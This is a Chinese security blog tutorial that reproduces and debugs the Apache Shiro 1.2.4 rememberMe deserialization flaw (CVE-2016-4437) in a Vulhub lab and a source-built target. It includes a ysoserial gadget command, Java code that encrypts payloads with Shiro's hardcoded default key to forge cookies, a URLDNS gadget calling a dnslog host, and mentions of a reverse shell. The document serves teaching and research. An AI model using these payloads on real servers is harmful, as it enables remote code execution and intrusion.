#  一篇文章说清楚Shiro-550漏洞   
0xNvyao  安全随笔   2024-03-11 20:30  
  
篇幅有点长了……不过不管是想看漏洞复现的还是代码调试，看这一篇就可以了。  
  
Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。  
Shiro-550指的是Apache Shiro 1.2.4反序列化漏洞，漏洞编号：CVE-2016-4437，影响版本是：Apache Shiro <= 1.2.4  
  
Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。本篇花点篇幅详细介绍下这个漏洞，包括漏洞复现、漏洞原理分析、代码调试等。  
  
目录：  
  
0x01，搭建靶场并复现  
Shiro-550漏洞  
  
    1）Vulhub的Shiro靶场  
  
    2）Apache shiro官方源码部署  
  
0x02，漏洞原理分析和代码调试  
  
    1）Remember Me功能介绍  
  
    2）  
Remember Me序列化流程  
  
    3）Remember Me反序列化流程  
  
0x03，纯手工复现加深理解  
  
  
**0x01，搭建靶场并复现Shiro-550漏洞**  
  
**Vulhub-Shiro靶场**  
  
1）安装Vulhub  
  
Vulhub是一个基于docker  
和docker-compose  
的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。  
  
Vulhub漏洞源码：https://github.com/vulhub/vulhub.git，需要在测试机器安装好docker  
和docker-compose  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2EibrlFcE2NLUyH5pYQ3uwVGOpO7vV68lJYIeQib6rzTZWL0NBE8TT3h6Q/640?wx_fmt=png&from=appmsg "")  
  
2）启动Shiro   
CVE-2016-4437靶场  
  
进入本地Vulhub的Shiro   
CVE-2016-4437子目录，  
执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：  
```
docker compose up -d
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2Euaj3GkZLGhKGdiaEqIznDb2uiaQ6xrUiaAIrN1XggicicrjDicfRicNe21o9A/640?wx_fmt=png&from=appmsg "")  
  
服务启动后，  
访问  
http://your-ip:8080  
可使用admin:vulhub  
进行登录：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2E5W1icHq9Qdgr5dRXdibA5oD486iaMRV6piahLOHExTM1lm1toqZUoMicIyg/640?wx_fmt=png&from=appmsg "")  
  
3）使用现成Shiro漏洞测试效果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2EFyz16DCx748Ip1KA90XrjdB9lcZ0BkzIXyFibeiaj0FD2qbTwvBYztRg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2EMAib9vuQkCm8650NxBpVxD9mIoCs7nDPFqaAYgGdsjQCfmEQiczmVBhA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2EamhtVQlzHHmdcADfpc1APL6HIHqc1zXZX3GdiaiaHbbmUjLq4lu83BCA/640?wx_fmt=png&from=appmsg "")  
  
成功反弹shell：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2Ey8cucTEvchfVAvazY1iaTuz3jib5skVP7VYf63TTc2xChxyw8ADHsZkw/640?wx_fmt=png&from=appmsg "")  
  
4  
）或者手动使用ysoserial生成CommonsBeanutils1的Gadget来验证  
```
java -jar ysoserial-all.jar CommonsBeanutils1 "touch /tmp/success111" > poc2.ser
```  
  
5）使用Shiro内置的默认密钥加密Payload：  
```
import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.nio.file.FileSystems;
import java.nio.file.Files;

public class Test {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("/Users/liujianping/IdeaProjects/java_code/SecVul/SerializableDemo/src/test/java/poc2.ser"));

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println(ciphertext.toString());
    }
}

```  
  
执行返回加密后的Payload，也就是rememberMe的值：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2EA1LDicT2hUtQmP0UOmHcmuxbRRHOvFL6e1EaSPpxLFA4gnaA9jmSvBg/640?wx_fmt=png&from=appmsg "")  
  
6）burpsuite抓包、手动发包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2EXNvsSD4oN8sCoNTrSmIQFIaLKZmx1K8GBGvYicG21TrichsyibYsU0Xcw/640?wx_fmt=png&from=appmsg "")  
  
7）进入容器验证效果，攻击成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1Dqj6heGGsrdg73sbNhn2EvpJMgVtmFYN24XGVb1EfWicS68IlhwelqEWmQxiaEj4cxeJTpGRnxc9g/640?wx_fmt=png&from=appmsg "")  
  
以上是Vulhub Shiro550靶场的搭建和漏洞复现，并且演示了两种复现方式。  
  
**Apache shiro官方源码部署**  
> Apache-Shiro项目地址  
  
> https://github.com/apache/shiro  
  
> Shiro-550项目代码  
  
> https://github.com/apache/shiro/releases/shiro-root-1.2.4  
  
  
以上是Apache Shiro项目官网源码地址，需要找到1.2.4版本的源码。现在开始通过官方源码来搭建1.2.4版本的Shiro靶场。  
  
⚠️注意  
⚠️：笔者在搭建Apache Shiro官方源码项目的时候，因为看到一篇文章说Shiro1.2.4需要在  
JDK   
1.6和Maven 3.2.1下编译，导致走了很多坑，后来经过查阅资料，发现1.8版本也是可以编译的！！！  
  
1）下载Shiro1.2.4源码并导入IDEA中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J09ibZAVRic7Awt2x1jCaaFPGCLR6Xibaia6IAIUbQ2AXpoicNk3tcLKN0JFMRP3ukNI99aSStvg1uPsSg/640?wx_fmt=png&from=appmsg "")  
  
项目导入后，会自动下载相关的依赖包。  
  
2）配置toolchains.xml  
  
如果不配置toolchains，编译会报如下错误...  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J09ibZAVRic7Awt2x1jCaaFPG1YnPRhiacuKtQMR8mB8NoqrL46zxHfPO7Sek9NC1wALZ0wD2myr6qog/640?wx_fmt=png&from=appmsg "")  
> Maven Toolchains介绍  
  
> https://maven.apache.org/guides/mini/guide-using-toolchains.html  
  
  
什么是toolchains？  
  
Maven 工具链为项目提供了一种指定用于构建项目的 JDK（或其他工具）的方法，而无需在每个插件或每个 pom.xml 中进行配置。  
  
当 Maven 工具链用于指定 JDK 时，可以通过  
独立于运行 Maven 的特定版本的 JDK 来构建项目。这类似于在 IDEA、NetBeans 和 Eclipse 等 IDE 中设置 JDK 版本的方式。  
  
根据maven官网关于toolchains的介绍，为了使用toolchains组件需要配置两个地方：  
  
2.1）添加/usr/local/apache-maven-3.9.3/conftoochains.xml文件，配置文件内容如下：  
```
<?xml version="1.0" encoding="UTF-8"?>
<toolchains xmlns="http://maven.apache.org/TOOLCHAINS/1.1.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd">
  <toolchain>
    <type>jdk</type>
    <provides>
      <version>1.8</version>
      <vendor>sun</vendor>
    </provides>
    <configuration>
      <jdkHome>/Library/Java/JavaVirtualMachines/jdk1.8.0_202.jdk/</jdkHome>
    </configuration>
  </toolchain>
</toolchains>
```  
  
2.2）Shiro中的samples-web项目pom文件添加toolschains插件  
```
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-toolchains-plugin</artifactId>
    <version>1.1</version>
    <executions>
      <execution>
        <goals>
          <goal>toolchain</goal>
        </goals>
      </execution>
    </executions>
    <configuration>
      <toolchains>
        <jdk>
          <version>1.8</version>
          <vendor>sun</vendor>
        </jdk>
      </toolchains>
    </configuration>
  </plugin>
```  
  
3）修改Shiro1.2.4项目中samples-web的jstl依赖版本为1.2  
```
<dependency>
     <groupId>javax.servlet</groupId>
     <artifactId>jstl</artifactId>
     <!--这里将jstl设置为1.2-->
     <version>1.2</version>
     <scope>runtime</scope>
</dependency>
```  
  
4）测试编译打包通过  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J09ibZAVRic7Awt2x1jCaaFPG8JiblebTa3DA0PNGcu1j04Hz3IhBTuaGaiar8z2dtkIQQ3tqcUKVFqNw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J09ibZAVRic7Awt2x1jCaaFPG2K1H5tMY05TxvUaaTv0icicicrR59cmSV6ej7zYUp7yjgZcdzqLGUcvicA/640?wx_fmt=png&from=appmsg "")  
  
5）IDEA配置tomcat启动项目  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J09ibZAVRic7Awt2x1jCaaFPGuMYVicOS2QkFMjnzFr1sO5yXshWbV4oSIco8GwbHNHF3SHTEVoBUgSg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J09ibZAVRic7Awt2x1jCaaFPGkac6YY9Mj9ShXdL4ePicHOyClnZ4Lb1SnpIz2Jvm1sUqJRUA8KkZ7iag/640?wx_fmt=png&from=appmsg "")  
  
启动成功：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J09ibZAVRic7Awt2x1jCaaFPGsbKvc6XpLkhJzHI3FA3Huzr6wlDhk1KaiaAZUTqZp1m0r2AvLjn3O2g/640?wx_fmt=png&from=appmsg "")  
  
当然，这里也可以自己部署一台tomcat，然后将上面打包的war放到tomcat的webapp目录下也行。  
  
6）Shiro漏洞利用工具测试效果  
  
这里说明一下，需要手动在Shiro项目的Samples web的pom文件中，添加4.0版本的  
commons-collections4 依赖，如下，不然执行Shiro反序列化利用会提示找不到利用链：  
```
<dependency>
     <groupId>org.apache.commons</groupId>
     <artifactId>commons-collections4</artifactId>
     <version>4.0</version>
</dependency>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1x69nR1qqvkEWvvT8ueQ2q5JVlYRqfCAERy2Pme17u1jcEEAubrzCqQkYvAoy5XtGfVGaDwfaBkw/640?wx_fmt=png&from=appmsg "")  
  
增加依赖后再次测试，可以反序列化了：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1x69nR1qqvkEWvvT8ueQ2qRvCXqUsPicibSxALuUMTUaYm9XWbYkOmKEsBzJ01USev5boqeebOwLdA/640?wx_fmt=png&from=appmsg "")  
  
反弹shell也是可以的：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J1x69nR1qqvkEWvvT8ueQ2qzxHVzwAGaBbAibzrMjIJIjxib6ZRGRwdPrliauMLdvrW4N978ZsicNP5GA/640?wx_fmt=png&from=appmsg "")  
  
当然这需要在服务端引入CommonsCollections组件，真实情况不可能给你引入的，所以还是需要找到一条shiro自身的利用链而不需要任何的前提条件，其实是有的，不过这篇文章不介绍了。  
  
总结一下Shiro550漏洞的复现，对比下来可以看到，Shiro官方的源码部署靶场确实比较困难，而且有不少坑，相对来说Vulhub真的太方便了，  
  
**0x02，漏洞原理分析**  
  
Shiro-550 反序列化漏洞产生原因是因为Shiro接受了Cookie里面rememberMe的值，然后去进行Base64解码后，再使用AES密钥解密后的数据，进行  
反序列化  
。  
> 什么是反序列化？  
  
> 0xNvyao，公众号：安全随笔[java序列化和反序列化](http://mp.weixin.qq.com/s?__biz=MzU1MTA4ODM4MQ==&mid=2247484913&idx=1&sn=5295919ee9faa7bfbe89b9599d400967&chksm=fb97fc63cce07575bcad2c13ad69fddd8bf3e625f648dabbca3bd0255556fcbb2e984d8e9ca6#rd)  
  
  
  
由于该版本AES加密的  
**密钥Key被硬编码在代码**  
里（这也是漏洞能够被利用的原理），这意味着**攻击者只要找到加密密钥就可以构造恶意对象**  
，对其进行序列化-->AES加密-->Base64编码，然后将其作为cookie的remmeberMe字段值发送给服务端，Shiro拿到数据将数据进行反向操作，也就是Base64解码-->AES解密-->反序列化，这样就触发了反序列化漏洞。  
  
那么这里构造恶意对象就比较简单了，可以是通过简单的URLDNS链来执行dnslog查询验证，也可以通过ysoserial来生成各种cc链对象进行RCE。  
> URLDNS链  
  
> 0xNvyao，公众号：安全随笔[一篇文章说清楚URLDNS链](http://mp.weixin.qq.com/s?__biz=MzU1MTA4ODM4MQ==&mid=2247485077&idx=1&sn=a43c96ff934dd7a57103ecb3d9508c6b&chksm=fb97ff07cce07611b92230b6cae94939e19e680657d612940ae877a7b82da875bd71cb121b1d#rd)  
  
  
  
  
**RememberMe功能说明**  
  
Shiro在  
**登陆处**提供了Remember Me这个功能，用来记录用户登陆状态，  
登陆的时候如果勾选了Remember Me，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。Shiro会对用户传入的cookie的rememberMe参数值进行  
**解密**并  
**进行反序列化为UserBean**，从而知道当前记住的是哪个用户。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J0fVLfbd3w3HjMeZkpUfRvN0FmP5o1oicnMibIx8CBlViaNoSFuGvfmApQjsoQfOyr6JFMpAOSocAV6g/640?wx_fmt=png&from=appmsg "")  
  
**RememberMe序列化流程**  
  
漏洞产生点在CookieRememberMeManager这个类，寻找其中有个方法：rememberSerializedIdentity。该方法的注释中写到：  
  
Base64-encodes the specified serialized byte array and sets that base64-encoded String as the cookie value.  
  
对指定的序列化字节数组进行 Base64 编码，并将该 Base64 编码的字符串设置为 cookie 值。  
  
这个就是Shiro RememberMe cookie值的生成过程，那么就往上查看该方法都是被怎么调用的：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThubhE5fBdSibX0icj7pMcy0IU1lJARS3GrD3r6wsdlgxFzCsRlHL6viaM0A/640?wx_fmt=png&from=appmsg "")  
  
来到父类AbstractRememberMeManager，该类调用了rememberSerializedIdentity方法，如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuTTLVvFN1TwlIztlIicTETtuhwFBiaAwae1gFGpwia0gXVoHmV5icfPqMDg/640?wx_fmt=png&from=appmsg "")  
  
继续跟进哪里调用了rememberIdentity方法，同样方式继续跟进：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuFiaWmJrk0ibMpArNeDkia7QhQ0zDST7HtkfJclXpNHCWba3RBclvzHokw/640?wx_fmt=png&from=appmsg "")  
  
来到了这里，发现  
rememberIdentity被onSuccessfulLogin方法调用，到这里就到了登陆成功的方法。  
  
总结一下，用户登陆成功后会调用AbstractRememberMeManager.onSuccessfulLogin方法，该方法主要是生成加密的RememberMe Cookie值，然后将生成的Cookie值给到前面分析的CookieRememberMeManager.rememberSerializedIdentity方法进行Base64编码并塞到HttpServletResponse中给到用户浏览器。  
  
下面通过动态调试看一下RememberMe的序列化及AES加密、Base64编码的全过程：  
  
来到上面分析的登陆成功处，打一个断点，然后web登陆入口输入root/secret口令进行提交，回到IDEA中一步步调试，来一次正向的分析：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThumK4ib498PicOYMO9MafZRqn4WdZQyqChIyXpclZltBIVByeiaurZwziasQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuxekQgU2lBY2iagfUibiaFNZdZC408OOC5y8J53AS1hDrIwCq0TSJFjETw/640?wx_fmt=png&from=appmsg "")  
  
来到断点处，如下图可以看到登陆提交的账号密码以及rememberMe=true：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThueZYwTgAb46UcL59PMET40W2Am1sxny9VgAk5pgbm7k94XujRId18Xg/640?wx_fmt=png&from=appmsg "")  
  
isRememberMe显然是用于判断用户是否选择了Remember Me选项，如果勾选了就会调用rememberIdentity方法并传入三个参数。继续跟进该方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuUMM0ygxiahBNuUpWqeMTicaOH6SxfwfJyzMEriaFUZYze25SFJUhHL09A/640?wx_fmt=png&from=appmsg "")  
  
继续跟进，来到AbstractRememberMeManager.rememberIdentity方法，里面调用convertPrincipalsToBytes方法，进入看看来到  
AbstractRememberMeManager.convertPrincipalsToBytes方法，可以看到，该方法先调用了serialize序列化，然后调用encrypt加密：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuAqXcQCRW5Ay3MxQXxpdzfX4NJ3tKubR2e5c0utVWRy30uOhLjnXpMg/640?wx_fmt=png&from=appmsg "")  
  
进入  
serialize方法，继续跟进getSerializer().serialize方法，看看序列化的具体实现。  
  
来到DefaultSerializer.serialize方法，进入这个方法就很清晰了：  
先创建一个  
ObjectOutputStream  
对象输出流  
，也就是序列化  
用的对象，  
将Simple  
PrincipalCollection  
类型  
的  
对象（o  
）  
写入  
ObjectOutputStream  
对象输出流，完成序列化操作。  
然后返回序列化后的Byte数组。  
  
执行完上面的  
getSerializer().serialize方法，又回到  
AbstractRememberMeManager.convertPrincipalsToBytes方法，下一步看到：bytes = encrypt(bytes);，跟进进入看下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuLxPaCBG6xXJ7IHwzib8ztFK2Yy87nAlLcLSZ20Tm2SfYtu3qRNMMPHg/640?wx_fmt=png&from=appmsg "")  
  
跟进到encrypt方法，传入了上一步生成的serialized后的字节数组  
参数，进入encrypt方法，可以先全局看下，大概能知道如图所示的：  
  
1）传入参数：前面序列化后的字节数据  
  
2）猜测getCipherService获取加密算法  
  
3）cipherService.encrypt(serialized, getEncryptionCipherKey())执行加密  
  
4）return value;返回加密后的字节数组数据  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuZ3epReP5agtFuCJd4nJZpY6Zib2sic756gAMPWYViatiadKyNV8G5egFRg/640?wx_fmt=png&from=appmsg "")  
  
跟进到getCipherService方法看下加密算法的详细定义：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThumSSssia2vyMsIJ7iadl69iblpW1KKK7JCISFIhU2xtcaoycWBxOM2nfZw/640?wx_fmt=png&from=appmsg "")  
  
CipherService是  
AbstractRememberMeManager类的一个属性，那么在类初始化完成后应该就给这个值赋值了，所以上图可以看到加密算法的一些属性：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuf5tsS5Y4kUoKLyicFUCnWwE4jJBn2IVXeOFS0z2q9SGr4l8aaMGjgsA/640?wx_fmt=png&from=appmsg "")  
  
查看常量DEFAULT_CIPHER_KEY_BYTES，就看到这个著名的“kPH+bIxk5D2deZiIxcaaaA==”密钥。  
  
继续分析，来到下面这行代码，跟进看看，进入JcaCipherService类的encrypt加密方法：  
```
ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThurIhnE8RrDjKPUricqqlsicdkqUichFmiaiaTUtxqjjGtsibHYwyncTiaeFGicg/640?wx_fmt=png&from=appmsg "")  
  
继续进入generateInitializationVector方法：猜测是获取AES加密的iv向量的，看看如何实现的：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuxZFP5BdzMue37w1SyxucQj9pGeiarl7K7SoffWsMmZ95GNv2XcUDluQ/640?wx_fmt=png&from=appmsg "")  
  
具体AES加密算法的实现比较复杂，也比较啰嗦不过多跟进了。直接来到加密结果：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuWC5lRpLc5II9RiaUic1UuyH86icH5jwopGKzFOfKUHugYtBZODCibWibnTw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThub3ia5wRcaPrY3zxWkSvWOse2xeWyVCpxGNyJWiaPAKjIVVdiaiaUkb85wQ/640?wx_fmt=png&from=appmsg "")  
  
下一步也是重要的一个方法，回到  
AbstractRememberMeManager.rememberIdentity方法中，进入rememberSerializedIdentity方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThu3gfRTAHRDALvYqh7ddwzs0sv1w3O10vJvbdo2TzWxm1RmICtPWgrEw/640?wx_fmt=png&from=appmsg "")  
  
跟进来到CookieRememberMeManager.rememberSerializedIdentity方法，参数中有一个serialized（加密后的序列化字节数组）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuobPdNm7pRCfSXFLkXulUtVxtdCZibyia9WFs4Gh8mDRUnrK9RcmSS7pw/640?wx_fmt=png&from=appmsg "")  
  
看到了吧，将加密后的bytes数组进行base64编码并且存储到cookie中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuWwVnECQlzmgaCdtpA55Hc7IfXLFLVqKDZ02FAM9nETuNeicQAicBcyhg/640?wx_fmt=png&from=appmsg "")  
  
**到这就分析完了rememberMe cookie值的序列化-->aes加密-->base64编码整个过程了。**  
  
**RememberMe反序列化流程**  
  
前面加密过程分析到AbstractRememberMeManager.encrypt，同样该类也有一个解密方法：  
AbstractRememberMeManager.de  
crypt，那就从这里入手。  
  
查一下decrypt是谁在调用：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuvuYvMwEjmV9zShMOSJmicvQic6mSAgEyNnvLZ4xgV76ERAw40zJbhPUQ/640?wx_fmt=png&from=appmsg "")  
  
进入convertBytesToPrincipals方法，可以看到调用了解密方法：  
```
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (getCipherService() != null) {
            bytes = decrypt(bytes);
        }
        return deserialize(bytes);
    }
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuNg4qgqYCpNkMmMzsg6XuJbfrPy12UicbSCHeEYiaj1VZ6sV7GJictWz8A/640?wx_fmt=png&from=appmsg "")  
  
在往上找一找，来到  
AbstractRememberMeManager.getRememberedPrincipals方法，随便打一个断点调试：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThutlVBTSR2JibgZ0sRPsqC1EJBujVBCkKeeibgemYEK1nlibbibO6pQhTdkw/640?wx_fmt=png&from=appmsg "")  
  
怎么触发进入断点呢，burpsuite随便发一个包，cookie中带rememberme即可：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThu8AKpj9edTdFW2BoJNVZ75B84ArSxI4DuppGROPBumUsUVmwS8rySsA/640?wx_fmt=png&from=appmsg "")  
  
跟进进入getRememberedSerializedIdentity方法，这里的代码比较清晰：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuYwxicQUHiceOkURkpMibtncNfYPaiamLBZRzk3KKQcftUaqibF5S1Q44BDQ/640?wx_fmt=png&from=appmsg "")  
  
获取请求带过来的rememberMe cookie base64值，进行base64解码返回。  
  
其中，base64 = ensurePadding(base64);是用来判断base64值是否有padding填充，这个是aes加密上的概念。判断逻辑代码如下：  
```
private String ensurePadding(String base64) {
        int length = base64.length();
        if (length % 4 != 0) {
            StringBuilder sb = new StringBuilder(base64);
            for (int i = 0; i < length % 4; ++i) {
                sb.append('=');
            }
            base64 = sb.toString();
        }
        return base64;
    }
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuLliaNJlOsjvOwib89fG2uoRPFysZo2o3wzpibSMTUQmvKo7B49NpKicVOw/640?wx_fmt=png&from=appmsg "")  
  
回到  
AbstractRememberMeManager.getRememberedPrincipals，跟进到convertBytesToPrincipals方法中：  
```
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (getCipherService() != null) {
            bytes = decrypt(bytes);
        }
        return deserialize(bytes);
    }
```  
  
  
准备执行decrypt方法 了，这里跟进进去看：  
  
getCipherService();这个和前面加密分析的类似，这行代码是获取aes加密算法的信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuGMGQsTD4O8Zz2Z01N1MJwgibhTmcxZs7h2aAibEBySa1HrEtaAfgYIyQ/640?wx_fmt=png&from=appmsg "")  
  
然后走到cipherService.decrypt方法，这个是繁琐的aes加密算法的细节实现，不再详细看了。最终走到：return decrypt(encrypted, key ,iv)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuMpeEsibMxCQlRiaEH2iaXrTNp2Txn4IjKibibVPexbx0e7SIvvhWeDjrKtg/640?wx_fmt=png&from=appmsg "")  
  
到这就拿到了解密的数据：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuntwjDvREcgicP0wbd9qdy2ZaIrZGuvMGqCMlqiah2Gf5OgWKb54h5Txg/640?wx_fmt=png&from=appmsg "")  
  
然后执行 return deserialize(bytes);，跟进进入看看：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThud8r1BNeCd9xzeXTP1nMb96gFoQib64M0XJZs6F8tjb5SDlqiagIElPjA/640?wx_fmt=png&from=appmsg "")  
  
重点来了，继续跟进来到：DefaultSerializer.deserialize方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuWCJYqmEku6VoObXWniaXHg7DNdQSgZfEj6kunBanpmWa35D5Yib6rC3g/640?wx_fmt=png&from=appmsg "")  
  
可以看到这里通过ois.readObject执行反序列化操作。**重点**  
  
然后继续往后走，直到走回到getRememberedPrincipals完成解密过程，返回principals是root对象（**记住了用户，最初的勾选rememberMe**）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThuJ74gYPRGCrJ2N2Pn7NiaPfnhzicn2BTdGBrCYicXddG9S1qRGn181otKw/640?wx_fmt=png&from=appmsg "")  
  
在Shiro框架中，principals 是指代用户身份的对象。它表示当前主体（Subject）的身份信息，可以是一个用户、角色、组织或其他身份标识。  
  
好了，分析了上面的反序列化过程，简单总结下就是：  
```
获取rememberMe值 -> Base64解码 -> AES解密 -> 调用readObject反序列化操作
```  
  
这不就是上一篇介绍的java原生反序列化流程吗，只要  
构造  
好恶意序列化数据，按照先AES加密，再Base64编码提交到Shiro服务端，Shiro就会按照上面流程就行反向解析从而最终执行readObject反序列化，达到攻击的效果。  
  
**0x03，纯手工复现加深理解**  
  
1）生成一个dnslog域名  
  
2）手工构造DNSLOG序列化数据：  
```
package com.nvyao.serializable;

import com.nvyao.bean.BadPerson;

import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNSDemo {
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("/Users/liujianping/Downloads/URLDNS.ser"));
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        System.out.println("序列化成功！");
    }

    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        System.out.println(obj);
        System.out.println("反序列化成功！");
        return obj;
    }

    public static void main(String[] args) throws Exception {
        // 以下演示HashMap+URL链
        //序列化
        HashMap<URL, Integer> hashMap = new HashMap<>();
        URL url = new URL("http://9o1yaa.dnslog.cn");
        //为了不让这里发起请求，把url对象的hashCode改成不是-1
//        Class<? extends URL> urlClass = url.getClass();
//        Field hashCodeField = urlClass.getDeclaredField("hashCode");
//        hashCodeField.setAccessible(true);
//        hashCodeField.set(url, 1234);
//        Integer rs = hashMap.put(url, 1);
//        System.out.println(rs);
//        hashCodeField.set(url, -1);
        serialize(hashMap);

        //反序列化
//        Object o = unserialize("/Users/liujianping/IdeaProjects/java_code/SecVul/SerializableDemo/URLDNSDemo.txt");
//        System.out.println(o);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hGAb3jria8J3QBekcgGUePS3EwN8eoThu7xUNlztRjZmYemECOVGUHuvGWqETl9MOIKoBAbzMC8HqicjPYm6Qic9g/640?wx_fmt=png&from=appmsg "")  
  
3）AES加密+Base64编码  
  
手动执行加密操作：  
```
import org.apache.shiro.codec.Base64;
